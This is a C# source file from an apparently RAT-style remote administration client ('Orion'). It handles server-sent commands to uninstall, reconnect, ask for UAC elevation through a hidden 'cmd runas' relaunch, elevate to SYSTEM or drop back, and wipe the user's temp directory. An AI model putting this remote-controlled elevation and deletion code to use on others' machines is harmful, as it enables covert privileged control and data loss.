using Microsoft.Win32;
using Orion.Client.Config;
using Orion.Client.Helper;
using Orion.Client.Networking;
using Orion.Client.Setup;
using Orion.Client.User;
using Orion.Client.Utilities;
using Orion.Common.Enums;
using Orion.Common.Messages;
using Orion.Common.Messages.ClientManagement;
using Orion.Common.Messages.ClientManagement.UAC;
using Orion.Common.Messages.Other;
using Orion.Common.Networking;
using System;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Orion.Client.Messages
{
    public class ClientServicesHandler : IMessageProcessor
    {
        private readonly OrionClient _client;
        private readonly OrionApplication _application;

        public ClientServicesHandler(OrionApplication application, OrionClient client)
        {
            _application = application;
            _client = client;
        }

        public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                     message is DoClientDisconnect ||
                                                     message is DoClientReconnect ||
                                                     message is DoAskElevate ||
                                                     message is DoElevateSystem ||
                                                     message is DoDeElevate ||
                                                     message is DoClearTempDirectory;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoClientUninstall msg:
                    Execute(sender, msg);
                    break;
                case DoClientDisconnect msg:
                    Execute(sender, msg);
                    break;
                case DoClientReconnect msg:
                    Execute(sender, msg);
                    break;
                case DoAskElevate msg:
                    Execute(sender, msg);
                    break;
                case DoElevateSystem msg:
                    Execute(sender, msg);
                    break;
                case DoDeElevate msg:
                    Execute(sender, msg);
                    break;
                case DoClearTempDirectory msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoClientUninstall message)
        {
            client.Send(new SetStatus { Message = "正在开始卸载..." });
            try
            {
                new ClientUninstaller().Uninstall();
                client.Send(new SetStatus { Message = "卸载完成，正在退出客户端。" });
                _client.Exit();
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"卸载失败: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoClientDisconnect message)
        {
            client.Send(new SetStatus { Message = "正在断开客户端..." });
            _client.Exit();
        }

        private void Execute(ISender client, DoClientReconnect message)
        {
            client.Send(new SetStatus { Message = "正在重新连接客户端..." });
            _client.Disconnect();
        }

        private void Execute(ISender client, DoAskElevate message)
        {
            var userAccount = new UserAccount();
            client.Send(new SetStatus { Message = "正在检查管理员权限..." });

            if (userAccount.Type != AccountType.Admin)
            {
                client.Send(new SetStatus { Message = "正在请求提权..." });

                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                _application.ApplicationMutex.Dispose();
                try
                {
                    Process.Start(processStartInfo);
                    client.Send(new SetStatus { Message = "提权进程已启动，正在退出当前实例。" });
                }
                catch
                {
                    client.Send(new SetStatus { Message = "用户拒绝了提权请求。" });
                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
                    return;
                }
                _client.Exit();
            }
            else
            {
                client.Send(new SetStatus { Message = "进程已以管理员权限运行。" });
            }
        }

        private void Execute(ISender client, DoElevateSystem message)
        {
            client.Send(new SetStatus { Message = "正在尝试提权到 SYSTEM..." });
            SystemElevation.Elevate(client);
        }

        private void Execute(ISender client, DoDeElevate message)
        {
            client.Send(new SetStatus { Message = "正在尝试从 SYSTEM 降权..." });
            SystemElevation.DeElevate(client);
        }

        private void Execute(ISender client, DoClearTempDirectory message)
        {
            client.Send(new SetStatus { Message = "正在开始清理临时文件..." });
            try
            {
                string tempPath = System.IO.Path.GetTempPath();
                string[] files = System.IO.Directory.GetFiles(tempPath, "*", System.IO.SearchOption.AllDirectories);
                int deletedFiles = 0;

                foreach (string file in files)
                {
                    try
                    {
                        System.IO.File.Delete(file);
                        deletedFiles++;
                    }
                    catch
                    {
                        // Ignore permission or lock errors
                    }
                }

                foreach (string dir in System.IO.Directory.GetDirectories(tempPath))
                {
                    try
                    {
                        System.IO.Directory.Delete(dir, true);
                    }
                    catch
                    {
                        // Ignore restricted directories
                    }
                }

                client.Send(new SetStatus { Message = $"清理完成 - 已删除 {deletedFiles} 个文件。" });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"清理临时文件失败: {ex.Message}" });
            }
        }
    }
}
